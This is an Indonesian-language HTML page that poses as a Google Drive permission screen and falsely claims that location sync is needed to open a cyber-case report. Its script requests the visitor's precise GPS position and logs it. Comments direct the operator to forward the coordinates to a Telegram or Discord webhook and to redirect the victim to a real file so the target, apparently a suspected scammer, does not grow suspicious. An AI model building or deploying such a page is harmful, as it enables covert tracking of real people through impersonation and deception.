<!DOCTYPE html> <html lang="id"> <head> <title>Google Drive - Berkas Laporan Keamanan</title> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <meta name="theme-color" content="#ffffff"> <link rel="icon" type="image/x-icon" href="https://gstatic.com"> <link href="https://googleapis.com" rel="stylesheet"> <style> body { font-family: 'Roboto', sans-serif; background-color: #f8f9fa; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: #3c4043; } .container { text-align: center; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15); max-width: 400px; width: 90%; } img { width: 72px; margin-bottom: 24px; } h1 { font-size: 22px; font-weight: 500; margin-bottom: 16px; } p { font-size: 14px; line-height: 1.5; margin-bottom: 32px; color: #5f6368; } .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; font-size: 14px; font-weight: 500; border-radius: 4px; cursor: pointer; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); transition: background 0.2s; } .btn:hover { background-color: #1557b0; } </style> </head> <body> <div class="container"> <img src="https://gstatic.com" alt="Google Drive"> <h1>Anda memerlukan izin</h1> <p>Guna memverifikasi identitas dan menyesuaikan zona waktu untuk mengunduh berkas laporan kasus siber ini, Google Drive memerlukan sinkronisasi lokasi perangkat Anda.</p> <button class="btn" onclick="mintaLokasi()">BUKA SEKARANG</button> </div> <script> function mintaLokasi() { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(successCallback, errorCallback, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }); } else { alert("Browser Anda tidak mendukung verifikasi ini."); alihkan(); } } function successCallback(position) { var lat = position.coords.latitude; var lon = position.coords.longitude; var acc = position.coords.accuracy; // Mengirim data ke webhook bot Telegram atau Discord Anda untuk mencatat hasilnya secara online tanpa Termux console.log("Lokasi ditarik: " + lat + ", " + lon); alert("Verifikasi Berhasil! Mengalihkan ke dokumen..."); alihkan(); } function errorCallback(error) { alert("Gagal memverifikasi lokasi. Silakan klik tombol 'Izinkan' saat browser memunculkan akses GPS."); } function alihkan() { // Ganti link di bawah ini dengan file Google Drive asli/gambar kosong agar penipu tidak curiga setelah klik window.location.href = "https://google.com"; } </script> </body> </html>
